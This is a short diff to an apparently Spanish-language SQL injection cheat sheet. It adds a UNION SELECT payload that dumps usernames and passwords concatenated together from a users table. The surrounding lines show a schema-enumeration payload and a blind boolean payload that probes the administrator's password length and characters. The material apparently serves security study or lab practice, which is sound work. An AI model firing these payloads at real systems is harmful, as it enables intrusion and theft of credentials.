@@ -44,6 +44,11 @@ En este documento recogemos las principales consultas de enumeración y extracci
 ' UNION SELECT 1, schema_name FROM information_schema.schemata limit 0,1-- -`
 ```
 
+## Concat
+```SQL
+' UNION SELECT NULL,CONCAT(username,'--->',password) FROM users-- -
+```
+
 ## Longitud
 ```SQL
 ' and (select substring(username,1,1) from users where username='administrator' and length(password)=20) = 'a'-- -
